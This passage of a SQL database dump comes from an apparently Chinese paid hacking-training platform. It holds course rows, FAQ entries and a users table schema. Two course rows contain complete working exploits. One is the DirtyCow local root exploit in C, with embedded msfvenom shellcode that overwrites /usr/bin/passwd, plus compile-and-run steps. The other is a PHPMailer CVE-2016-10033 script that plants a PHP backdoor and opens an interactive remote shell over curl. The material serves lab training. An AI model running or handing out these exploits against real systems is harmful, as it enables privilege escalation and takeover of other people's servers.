NULL);  \r\n    return 0;  \r\n}</code></pre><p><br></p>',0,''),(101,'脏牛漏洞基础训练二','利用我们自己提供的poc直接提权成root权限','<p>上一节我们讲解了脏牛漏洞修改文件的过程，这一节我们讲解一下如何直接通过普通用户提权成root用户</p><p>1：安装编译工具，root环境</p><p>&nbsp; &nbsp; yum install -y gcc</p><p>&nbsp; &nbsp; yum install -y gcc-c++</p><p>2：创建mmc用户</p><p>&nbsp; &nbsp; adduser mmc<br></p><p>&nbsp; &nbsp; passwd mmc 回车输入密码123456<br></p><p>3：切换到mmc用户</p><p>&nbsp; &nbsp; su mmc<br></p><p>4:创建在tmp文件夹下创建m.c文件，文件内容见课程分析</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/znroot1.png\"><br></p><p>5：编译m.c文件</p><p>&nbsp;gcc m.c -o cowroot -pthread</p><p>命令执行完以后会生成cowroot可执行文件</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/znroot2.png\"><br></p><p>6：直接在当前目录下执行这个可执行文件</p><p>./cowroot</p><p>会看到由$符号变成了#说明由普通权限变成了root权限也可以输入id看下</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/znroot3.png\"><br></p><p><br></p><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/zn.png','centos:latest','2016-11-01 11:38:02',1,NULL,'<p>直接提权成root权限的exp</p><pre style=\"max-width: 100%;\"><code class=\"cpp hljs\" codemark=\"1\"><span class=\"hljs-comment\">/*\r\n* (un)comment correct payload first (x86 or x64)!\r\n* \r\n* $ gcc cowroot.c -o cowroot -pthread\r\n* $ ./cowroot\r\n* DirtyCow root privilege escalation\r\n* Backing up /usr/bin/passwd.. to /tmp/bak\r\n* Size of binary: 57048\r\n* Racing, this may take a while..\r\n* /usr/bin/passwd overwritten\r\n* Popping root shell.\r\n* Don\'t forget to restore /tmp/bak\r\n* thread stopped\r\n* thread stopped\r\n* root@box:/root/cow# id\r\n* uid=0(root) gid=1000(foo) groups=1000(foo)\r\n*\r\n* @robinverton \r\n*/</span>\r\n\r\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">include</span> <span class=\"hljs-meta-string\">&lt;stdio.h&gt;</span></span>\r\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">include</span> <span class=\"hljs-meta-string\">&lt;stdlib.h&gt;</span></span>\r\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">include</span> <span class=\"hljs-meta-string\">&lt;sys/mman.h&gt;</span></span>\r\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">include</span> <span class=\"hljs-meta-string\">&lt;fcntl.h&gt;</span></span>\r\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">include</span> <span class=\"hljs-meta-string\">&lt;pthread.h&gt;</span></span>\r\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">include</span> <span class=\"hljs-meta-string\">&lt;string.h&gt;</span></span>\r\n<span class=\"hljs-meta\">#<span class=\"hljs-meta-keyword\">include</span> <span class=\"hljs-meta-string\">&lt;unistd.h&gt;</span></span>\r\n\r\n<span class=\"hljs-keyword\">void</span> *<span class=\"hljs-built_in\">map</span>;\r\n<span class=\"hljs-keyword\">int</span> f;\r\n<span class=\"hljs-keyword\">int</span> stop = <span class=\"hljs-number\">0</span>;\r\n<span class=\"hljs-keyword\">struct</span> stat st;\r\n<span class=\"hljs-keyword\">char</span> *name;\r\n<span class=\"hljs-keyword\">pthread_t</span> pth1,pth2,pth3;\r\n\r\n<span class=\"hljs-comment\">// change if no permissions to read</span>\r\n<span class=\"hljs-keyword\">char</span> suid_binary[] = <span class=\"hljs-string\">\"/usr/bin/passwd\"</span>;\r\n\r\n<span class=\"hljs-comment\">/*\r\n* msfvenom -p linux/x64/exec CMD=\"echo \'0\' &gt; /proc/sys/vm/dirty_writeback_centisecs;/bin/bash\" PrependSetuid=True -f elf | xxd -i\r\n*/</span>\r\n<span class=\"hljs-keyword\">unsigned</span> <span class=\"hljs-keyword\">char</span> sc[] = {\r\n  <span class=\"hljs-number\">0x7f</span>, <span class=\"hljs-number\">0x45</span>, <span class=\"hljs-number\">0x4c</span>, <span class=\"hljs-number\">0x46</span>, <span class=\"hljs-number\">0x02</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>,\r\n  <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x02</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x3e</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>,\r\n  <span class=\"hljs-number\">0x78</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x40</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x40</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>,\r\n  <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>,\r\n  <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x40</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x38</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>,\r\n  <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x07</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>,\r\n  <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x40</span>, <span class=\"hljs-number\">0x00</span>,\r\n  <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x40</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>,\r\n  <span class=\"hljs-number\">0xe3</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x4e</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>,\r\n  <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x10</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>,\r\n  <span class=\"hljs-number\">0x48</span>, <span class=\"hljs-number\">0x31</span>, <span class=\"hljs-number\">0xff</span>, <span class=\"hljs-number\">0x6a</span>, <span class=\"hljs-number\">0x69</span>, <span class=\"hljs-number\">0x58</span>, <span class=\"hljs-number\">0x0f</span>, <span class=\"hljs-number\">0x05</span>, <span class=\"hljs-number\">0x6a</span>, <span class=\"hljs-number\">0x3b</span>, <span class=\"hljs-number\">0x58</span>, <span class=\"hljs-number\">0x99</span>,\r\n  <span class=\"hljs-number\">0x48</span>, <span class=\"hljs-number\">0xbb</span>, <span class=\"hljs-number\">0x2f</span>, <span class=\"hljs-number\">0x62</span>, <span class=\"hljs-number\">0x69</span>, <span class=\"hljs-number\">0x6e</span>, <span class=\"hljs-number\">0x2f</span>, <span class=\"hljs-number\">0x73</span>, <span class=\"hljs-number\">0x68</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x53</span>, <span class=\"hljs-number\">0x48</span>,\r\n  <span class=\"hljs-number\">0x89</span>, <span class=\"hljs-number\">0xe7</span>, <span class=\"hljs-number\">0x68</span>, <span class=\"hljs-number\">0x2d</span>, <span class=\"hljs-number\">0x63</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x48</span>, <span class=\"hljs-number\">0x89</span>, <span class=\"hljs-number\">0xe6</span>, <span class=\"hljs-number\">0x52</span>, <span class=\"hljs-number\">0xe8</span>,\r\n  <span class=\"hljs-number\">0x3c</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x65</span>, <span class=\"hljs-number\">0x63</span>, <span class=\"hljs-number\">0x68</span>, <span class=\"hljs-number\">0x6f</span>, <span class=\"hljs-number\">0x20</span>, <span class=\"hljs-number\">0x27</span>, <span class=\"hljs-number\">0x30</span>, <span class=\"hljs-number\">0x27</span>,\r\n  <span class=\"hljs-number\">0x20</span>, <span class=\"hljs-number\">0x3e</span>, <span class=\"hljs-number\">0x20</span>, <span class=\"hljs-number\">0x2f</span>, <span class=\"hljs-number\">0x70</span>, <span class=\"hljs-number\">0x72</span>, <span class=\"hljs-number\">0x6f</span>, <span class=\"hljs-number\">0x63</span>, <span class=\"hljs-number\">0x2f</span>, <span class=\"hljs-number\">0x73</span>, <span class=\"hljs-number\">0x79</span>, <span class=\"hljs-number\">0x73</span>,\r\n  <span class=\"hljs-number\">0x2f</span>, <span class=\"hljs-number\">0x76</span>, <span class=\"hljs-number\">0x6d</span>, <span class=\"hljs-number\">0x2f</span>, <span class=\"hljs-number\">0x64</span>, <span class=\"hljs-number\">0x69</span>, <span class=\"hljs-number\">0x72</span>, <span class=\"hljs-number\">0x74</span>, <span class=\"hljs-number\">0x79</span>, <span class=\"hljs-number\">0x5f</span>, <span class=\"hljs-number\">0x77</span>, <span class=\"hljs-number\">0x72</span>,\r\n  <span class=\"hljs-number\">0x69</span>, <span class=\"hljs-number\">0x74</span>, <span class=\"hljs-number\">0x65</span>, <span class=\"hljs-number\">0x62</span>, <span class=\"hljs-number\">0x61</span>, <span class=\"hljs-number\">0x63</span>, <span class=\"hljs-number\">0x6b</span>, <span class=\"hljs-number\">0x5f</span>, <span class=\"hljs-number\">0x63</span>, <span class=\"hljs-number\">0x65</span>, <span class=\"hljs-number\">0x6e</span>, <span class=\"hljs-number\">0x74</span>,\r\n  <span class=\"hljs-number\">0x69</span>, <span class=\"hljs-number\">0x73</span>, <span class=\"hljs-number\">0x65</span>, <span class=\"hljs-number\">0x63</span>, <span class=\"hljs-number\">0x73</span>, <span class=\"hljs-number\">0x3b</span>, <span class=\"hljs-number\">0x2f</span>, <span class=\"hljs-number\">0x62</span>, <span class=\"hljs-number\">0x69</span>, <span class=\"hljs-number\">0x6e</span>, <span class=\"hljs-number\">0x2f</span>, <span class=\"hljs-number\">0x62</span>,\r\n  <span class=\"hljs-number\">0x61</span>, <span class=\"hljs-number\">0x73</span>, <span class=\"hljs-number\">0x68</span>, <span class=\"hljs-number\">0x00</span>, <span class=\"hljs-number\">0x56</span>, <span class=\"hljs-number\">0x57</span>, <span class=\"hljs-number\">0x48</span>, <span class=\"hljs-number\">0x89</span>, <span class=\"hljs-number\">0xe6</span>, <span class=\"hljs-number\">0x0f</span>, <span class=\"hljs-number\">0x05</span>\r\n};\r\n<span class=\"hljs-keyword\">unsigned</span> <span class=\"hljs-keyword\">int</span> sc_len = <span class=\"hljs-number\">227</span>;\r\n\r\n\r\n<span class=\"hljs-comment\">/*\r\n* msfvenom -p linux/x86/exec CMD=\"echo \'0\' &gt; /proc/sys/vm/dirty_writeback_centisecs;/bin/bash\" PrependSetuid=True -f elf | xxd -i\r\nunsigned char sc[] = {\r\n  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,\r\n  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,\r\n  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0xba, 0x00, 0x00, 0x00,\r\n  0x20, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,\r\n  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,\r\n  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,\r\n  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x3c, 0x00, 0x00, 0x00,\r\n  0x65, 0x63, 0x68, 0x6f, 0x20, 0x27, 0x30, 0x27, 0x20, 0x3e, 0x20, 0x2f,\r\n  0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x79, 0x73, 0x2f, 0x76, 0x6d, 0x2f,\r\n  0x64, 0x69, 0x72, 0x74, 0x79, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x62,\r\n  0x61, 0x63, 0x6b, 0x5f, 0x63, 0x65, 0x6e, 0x74, 0x69, 0x73, 0x65, 0x63,\r\n  0x73, 0x3b, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00,\r\n  0x57, 0x53, 0x89, 0xe1, 0xcd, 0x80\r\n};\r\nunsigned int sc_len = 186;\r\n*/</span>\r\n\r\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> *<span class=\"hljs-title\">madviseThread</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">void</span> *arg)</span>\r\n</span>{\r\n    <span class=\"hljs-keyword\">char</span> *str;\r\n    str=(<span class=\"hljs-keyword\">char</span>*)arg;\r\n    <span class=\"hljs-keyword\">int</span> i,c=<span class=\"hljs-number\">0</span>;\r\n    <span class=\"hljs-keyword\">for</span>(i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">1000000</span> &amp;&amp; !stop;i++) {\r\n        c+=madvise(<span class=\"hljs-built_in\">map</span>,<span class=\"hljs-number\">100</span>,MADV_DONTNEED);\r\n    }\r\n    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"thread stopped\\n\"</span>);\r\n}\r\n\r\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> *<span class=\"hljs-title\">procselfmemThread</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">void</span> *arg)</span>\r\n</span>{\r\n    <span class=\"hljs-keyword\">char</span> *str;\r\n    str=(<span class=\"hljs-keyword\">char</span>*)arg;\r\n    <span class=\"hljs-keyword\">int</span> f=open(<span class=\"hljs-string\">\"/proc/self/mem\"</span>,O_RDWR);\r\n    <span class=\"hljs-keyword\">int</span> i,c=<span class=\"hljs-number\">0</span>;\r\n    <span class=\"hljs-keyword\">for</span>(i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">1000000</span> &amp;&amp; !stop;i++) {\r\n        lseek(f,<span class=\"hljs-built_in\">map</span>,SEEK_SET);\r\n        c+=write(f, str, sc_len);\r\n    }\r\n    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"thread stopped\\n\"</span>);\r\n}\r\n\r\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> *<span class=\"hljs-title\">waitForWrite</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">void</span> *arg)</span> </span>{\r\n    <span class=\"hljs-keyword\">char</span> buf[sc_len];\r\n\r\n    <span class=\"hljs-keyword\">for</span>(;;) {\r\n        FILE *fp = fopen(suid_binary, <span class=\"hljs-string\">\"rb\"</span>);\r\n\r\n        fread(buf, sc_len, <span class=\"hljs-number\">1</span>, fp);\r\n\r\n        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-built_in\">memcmp</span>(buf, sc, sc_len) == <span class=\"hljs-number\">0</span>) {\r\n            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"%s overwritten\\n\"</span>, suid_binary);\r\n            <span class=\"hljs-keyword\">break</span>;\r\n        }\r\n\r\n        fclose(fp);\r\n        sleep(<span class=\"hljs-number\">1</span>);\r\n    }\r\n\r\n    stop = <span class=\"hljs-number\">1</span>;\r\n\r\n    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Popping root shell.\\n\"</span>);\r\n    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Don\'t forget to restore /tmp/bak\\n\"</span>);\r\n\r\n    system(suid_binary);\r\n}\r\n\r\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">int</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">int</span> argc,<span class=\"hljs-keyword\">char</span> *argv[])</span> </span>{\r\n    <span class=\"hljs-keyword\">char</span> *backup;\r\n\r\n    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"DirtyCow root privilege escalation\\n\"</span>);\r\n    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Backing up %s to /tmp/bak\\n\"</span>, suid_binary);\r\n\r\n    asprintf(&amp;backup, <span class=\"hljs-string\">\"cp %s /tmp/bak\"</span>, suid_binary);\r\n    system(backup);\r\n\r\n    f = open(suid_binary,O_RDONLY);\r\n    fstat(f,&amp;st);\r\n\r\n    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Size of binary: %d\\n\"</span>, st.st_size);\r\n\r\n    <span class=\"hljs-keyword\">char</span> payload[st.st_size];\r\n    <span class=\"hljs-built_in\">memset</span>(payload, <span class=\"hljs-number\">0x90</span>, st.st_size);\r\n    <span class=\"hljs-built_in\">memcpy</span>(payload, sc, sc_len+<span class=\"hljs-number\">1</span>);\r\n\r\n    <span class=\"hljs-built_in\">map</span> = mmap(<span class=\"hljs-literal\">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class=\"hljs-number\">0</span>);\r\n\r\n    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Racing, this may take a while..\\n\"</span>);\r\n\r\n    pthread_create(&amp;pth1, <span class=\"hljs-literal\">NULL</span>, &amp;madviseThread, suid_binary);\r\n    pthread_create(&amp;pth2, <span class=\"hljs-literal\">NULL</span>, &amp;procselfmemThread, payload);\r\n    pthread_create(&amp;pth3, <span class=\"hljs-literal\">NULL</span>, &amp;waitForWrite, <span class=\"hljs-literal\">NULL</span>);\r\n\r\n    pthread_join(pth3, <span class=\"hljs-literal\">NULL</span>);\r\n\r\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\r\n}</code></pre><p><br></p>',0,''),(102,'PHPMailer远程代码执行','PHPMailer远程代码执行漏洞测试和分析','<p>1）exploit.sh</p><pre style=\"max-width: 100%;\"><code class=\"bash hljs\" codemark=\"1\"><p>#!/bin/bash\r\n</p><p>#&nbsp;CVE-2016-10033&nbsp;exploit&nbsp;by&nbsp;opsxcq\r\n</p><p>#&nbsp;https://github.com/opsxcq/exploit-CVE-2016-10033\r\n</p><p>echo&nbsp;\'[+]&nbsp;CVE-2016-10033&nbsp;exploit&nbsp;by&nbsp;opsxcq\'\r\n</p><p>if&nbsp;[&nbsp;-z&nbsp;\"$1\"&nbsp;]\r\n</p><p>then\r\n</p><p>&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;\'[-]&nbsp;Please&nbsp;inform&nbsp;an&nbsp;host&nbsp;as&nbsp;parameter\'\r\n</p><p>&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;-1\r\n</p><p>fi\r\n</p><p>host=$1\r\n</p><p>echo&nbsp;\'[+]&nbsp;Exploiting&nbsp;\'$host\r\n</p><p>curl&nbsp;-sq&nbsp;\'http://\'$host&nbsp;-H&nbsp;\'Content-Type:&nbsp;multipart/form-data;&nbsp;boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe\'&nbsp;--data-binary&nbsp;$\'------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition:&nbsp;form-data;&nbsp;name=\"action\"\\r\\n\\r\\nsubmit\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition:&nbsp;form-data;&nbsp;name=\"name\"\\r\\n\\r\\n&lt;?php&nbsp;echo&nbsp;\"|\".base64_encode(system(base64_decode($_GET[\"cmd\"]))).\"|\";&nbsp;?&gt;\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition:&nbsp;form-data;&nbsp;name=\"email\"\\r\\n\\r\\n\\\"vulnerables\\\\\\\"&nbsp;-OQueueDirectory=/tmp&nbsp;-X/www/backdoor.php&nbsp;server\\\"&nbsp;@test.com\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition:&nbsp;form-data;&nbsp;name=\"message\"\\r\\n\\r\\nPwned\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\\r\\n\'&nbsp;&gt;/dev/null&nbsp;&amp;&amp;&nbsp;echo&nbsp;\'[+]&nbsp;Target&nbsp;exploited,&nbsp;acessing&nbsp;shell&nbsp;at&nbsp;http://\'$host\'/backdoor.php\'\r\n</p><p>cmd=\'whoami\'\r\n</p><p>while&nbsp;[&nbsp;\"$cmd\"&nbsp;!=&nbsp;\'exit\'&nbsp;]\r\n</p><p>do\r\n</p><p>&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;\'[+]&nbsp;Running&nbsp;\'$cmd\r\n</p><p>&nbsp;&nbsp;&nbsp;&nbsp;curl&nbsp;-sq&nbsp;http://$host/backdoor.php?cmd=$(echo&nbsp;-ne&nbsp;$cmd&nbsp;|&nbsp;base64)&nbsp;|&nbsp;grep&nbsp;\'|\'&nbsp;|&nbsp;grep&nbsp;-v&nbsp;\'base64_encode\'&nbsp;|&nbsp;head&nbsp;-n&nbsp;1&nbsp;|&nbsp;cut&nbsp;-d&nbsp;\'|\'&nbsp;-f&nbsp;2&nbsp;|&nbsp;base64&nbsp;-d\r\n</p><p>&nbsp;&nbsp;&nbsp;&nbsp;echo\r\n</p><p>&nbsp;&nbsp;&nbsp;&nbsp;read&nbsp;-p&nbsp;\'RemoteShell&gt;&nbsp;\'&nbsp;cmd\r\n</p><p>done\r\n</p><p>echo&nbsp;\'[+]&nbsp;Exiting\'</p></code></pre><p>2）chmod -R 777 exploit.sh</p><p>3）./exploit.sh fb82aae99cf8fbd9.lysec.org:80 &nbsp; //一定要加端口</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/phpmailer2.png\"><br></p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/phpmailer1.png\"><br></p><p><br></p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/phpmailer3.jpg','daocloud.io/catteam/phpmailer:master-69243a6','2016-12-29 13:18:23',1,NULL,'<p><a href=\"http://www.mottoin.com/94543.html\" target=\"_blank\">http://www.mottoin.com/94543.html</a></p><p><br></p>',1,'');

/*Table structure for table `qa` */

DROP TABLE IF EXISTS `qa`;

CREATE TABLE `qa` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `meta_key` varchar(100) DEFAULT NULL,
  `meta_value` text,
  `type` varchar(20) DEFAULT NULL,
  `sort_order` tinyint(3) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;

/*Data for the table `qa` */

insert  into `qa`(`id`,`meta_key`,`meta_value`,`type`,`sort_order`) values (5,'平台针对的学习对象','<p>猎鹰云攻防实训平台针对0基础热爱信息安全，热爱黑客技术的朋友</p>','qa',0),(6,'猎鹰云安全是否免费','<p>目前平台不免费开放，需要学习的朋友可以加客服QQ咨询。</p>','qa',0),(7,'猎鹰安全唯一官方咨询服务QQ','2022137639','qa',0),(8,'学员学习指南','<p>1）登录系统</p><p>2）选择要学习的课程比如SQL基础训练课程一</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E6%8C%87%E5%AF%BC1.png\"><br></p><p>3）点击进入系统</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E6%8C%87%E5%AF%BC2.png\"><br></p><p>4）开始部署课程准备学习</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E6%8C%87%E5%AF%BC3.png\" class=\"\"><br></p><p>5）进入虚拟环境</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E6%8C%87%E5%AF%BC4.png\" class=\"\"><br></p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E6%8C%87%E5%AF%BC5.png\" class=\"\"><br></p><p>6）登陆虚拟环境以后选择web安全</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E6%8C%87%E5%AF%BC6.png\" class=\"clicked\"><br></p><p>7）选择sql注入，基础练习</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E6%8C%87%E5%AF%BC7.png\"><br></p><p>8）进入到最终训练页面做sql注入基础训练</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E6%8C%87%E5%AF%BC8.png\"><br></p><p><br></p><p><br></p>','qa',0),(9,'平台学习内容指导','<p>目前云平台提供web安全，系统安全，移动安全，php基础学习，以及CTF学习。以后会有更多的学习类别上线。</p>','qa',0),(10,'学习账号开通指南','<p>1）发送 昵称 邮箱 电话到 2022137639@qq.com 注明开通学习账号</p><p>2）客服收到邮件以后会开通体验账号</p><p>3）体验账号只能学习两个课程，SSRF基础训练一和PHP反序列化基础训练（这两个课程属于web安全分类）</p><p><br></p>','qa',0);

/*Table structure for table `users` */

DROP TABLE IF EXISTS `users`;

CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) COLLATE utf8_unicode_ci NOT NULL,
  `password` varchar(60) COLLATE utf8_unicode_ci NOT NULL,
  `name` varchar(120) COLLATE utf8_unicode_ci DEFAULT NULL,
  `role` varchar(20) COLLATE utf8_unicode_ci NOT NULL DEFAULT 'user',
  `email` varchar(70) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `active` char(1) COLLATE utf8_unicode_ci NOT NULL,
  `phone` char(11) CHARACTER SET utf8 DEFAULT NULL COMMENT '手机号',
  `icon_url` varchar(100) CHARACTER SET utf8 DEFAULT NULL COMMENT '头像url',
  `login_last_ip` varchar(50) CHARACTER SET utf8 NOT NULL DEFAULT ' ' COMMENT '用户最后登陆的ip',
  `pay_flag` int(3) NOT NULL DEFAULT '0' COMMENT '付费标识',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1014 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

/*Data for the table `users` */

